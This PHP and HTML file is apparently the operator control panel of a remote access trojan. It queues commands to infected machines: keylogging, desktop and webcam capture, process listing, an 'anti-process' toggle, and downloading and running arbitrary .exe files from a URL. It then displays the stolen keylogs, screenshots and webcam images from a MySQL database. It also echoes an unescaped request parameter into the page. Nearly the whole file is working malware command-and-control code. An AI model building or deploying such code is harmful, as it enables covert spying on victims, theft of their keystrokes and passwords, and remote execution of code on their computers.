<?php  
	if(isset($_GET['client']) && !empty($_GET['client'])){
		$client =  $_GET['client'] ;
	}
	elseif (isset($_POST['client']) && !empty($_POST['client'])){
		$client = $_POST['client'];
	}
	else{
		$client = 'no client';
	}			
			
?>
		

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Control Server</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color: #659dbd;
      padding: 20px;
    }
    button{
		padding: 10px;
	}
	#kget, #dcget, #startkg, #stopkg, #dcstart, #dcstop, #pclist, #pcget, #uninstall, #uninstallstop, #shutdown, #restart, #wbget, #wbshow, #wbstop, #antistart, #antistop{
		display: inline-block;
	}
	input[type="button"], input[type="submit"]{
		font-family: cournier new;
	}
   
  </style>
  <script type="text/javascript">
	function fillText(check) {
		if (check == 'keystart') {
		document.getElementById("boxfill").value = "startkeylog";
		}
		else if (check == 'stopkeylog') {
			document.getElementById("boxfill").value = "stopkeylog";
		}
		else if (check == 'startdesktop') {
			document.getElementById("boxfill").value = "startdc";
		}
		else if (check == 'stopdesktop') {
			document.getElementById("boxfill").value = "stopdc";
		}
		else if (check == 'getpclist') {
			document.getElementById("boxfill").value = "getpclist";
		}
		else if (check == 'uninstall') {
			document.getElementById("boxfill").value = "uninstall";
		}
		else if (check == 'uninstall stop') {
			document.getElementById("boxfill").value = "uninstall stop";
		}
		else if (check == 'shutdown') {
			document.getElementById("boxfill").value = "shutdown";
		}
		else if (check == 'restart') {
			document.getElementById("boxfill").value = "restart";
		}
		else if (check == 'getwebcam') {
			document.getElementById("boxfill").value = "webcam";
		}
		else if (check == 'anti start') {
			document.getElementById("boxfill").value = "anti start";
		}
		else if (check == 'anti stop') {
			document.getElementById("boxfill").value = "anti stop";
		}
	}
	function Instructions() {
		alert("Paste direct download link into Command Box starting with http. Exe Files Only.");
		document.getElementById("boxfill").value = "http";
	}
  </script>
</head>
<body>
  <div id="command-form">
      <h2>Control Panel</h2>
   	  <form method="post" action="openClient.php" id="cmdform"> 
	    
		Client: <input type="text" name="client" readonly value="<?php echo $client ?>"/>
		<p>Send Command: </p>
		<input type="text" id="boxfill" name="cmdstr" size="35%">
		<p><input type="submit" name="buttonExecute"  value="Send"></p>
		
			<p id = "result"><input type="submit" name="buttonGetResult"  value="Fetch Result"></p>
			<p id = "dlInstructions"><input type="button" name="buttonShowInstructions"  value="Download and Execute (Exe)"onclick="Instructions()"></p>
			<p id = "startkg"><input type="button" name="buttonStartKeylog"  value="Start Keylog" onclick="fillText('keystart')"></p>
			<p id = "kget"><input type="submit" name="buttonGetKeylog"  value="Get Keylog"></p>
			<p id = "stopkg"><input type="button" name="buttonStopKeylog"  value="Stop Keylog" onclick="fillText('stopkeylog')"></p>
			<p id = "dcstart"><input type="button" name="buttonStartDesktop"  value="Start Desktop" onclick="fillText('startdesktop')"></p>
			<p id = "dcget"><input type="submit" name="buttonGetDesktop"  value="Get Desktop"></p>
			<p id = "dcstop"><input type="button" name="buttonStopDesktop"  value="Stop Desktop" onclick="fillText('stopdesktop')"></p>
			<p id = "wbget"><input type="button" name="buttonGetWebcam"  value="Capture Webcam" onclick="fillText('getwebcam')"></p>
			<p id = "wbshow"><input type="submit" name="buttonShowWebcam"  value="Show Webcam"></p>
			<p id ="pclist"><input type="button" name="buttonPcList" value="Process List" onclick="fillText('getpclist')"></p>
			<p id = "pcget"><input type="submit" name="buttonFetchProcess"  value="Fetch Process List"></p>
			<p id ="antistart"><input type="button" name="buttonAntiStart" value="Enable Anti-Process" onclick="fillText('anti start')"></p>
			<p id ="antistop"><input type="button" name="buttonAntiStop" value="Disable Anti-Process" onclick="fillText('anti stop')"></p>
			<p id = "uninstall"><input type="button" name="buttonUninstall"  value="Uninstall" onclick="fillText('uninstall stop')"></p>
			<p id = "uninstallstop"><input type="button" name="buttonUninstallStop"  value="Remove Startup" onclick="fillText('uninstall')"></p>
			<p id = "shutdown"><input type="button" name="buttonShutdown"  value="Shutdown" onclick="fillText('shutdown')"></p>
			<p id = "restart"><input type="button" name="buttonRestart"  value="Restart" onclick="fillText('restart')"></p>
			<p><a href='index.php'>Back to Main</a></p>
	  </form> 
  </div>
	
</body>
</html>


<?php
	
	if(isset($_POST['buttonExecute'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		if(isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])){
			
			$cmdstr = $_POST['cmdstr'];
			echo 'Received: '.$cmdstr.'<br>';
			$query="UPDATE clients SET cmd=? WHERE name=?";
			$stmt = $db->prepare($query);
			$stmt->bind_param('ss',$cmdstr,$client);
			$stmt->execute();
		
			$db->close();
		}
		  
		
		
	}
	elseif(isset($_POST['buttonGetResult'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT retstr FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($retStr);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $retStr;
		echo "</textarea>";
		$db->close();
	}
	elseif(isset($_POST['buttonFetchProcess'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT pclist FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($pclist);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $pclist;
		echo "</textarea>";
		$db->close();
	}
	elseif(isset($_POST['buttonGetKeylog'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT keylog FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($keylog);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $keylog;
		echo "</textarea>";
		$db->close();
		
	}
	elseif(isset($_POST['buttonGetDesktop'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT desktop FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($desktop);
		$stmt->fetch();
		
		echo "<img width='600' src= 'data:image/jpeg;base64,".base64_encode( $desktop) . "'/>";
		
		$db->close();
		
	}
	elseif(isset($_POST['buttonShowWebcam'])){
		$db = new mysqli('localhost', 'root','', 'controlserver');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT webcam FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($webcam);
		$stmt->fetch();
		
		echo "<img width='600' src= 'data:image/jpeg;base64,".base64_encode( $webcam) . "'/>";
		
		$db->close();
		
	}
?>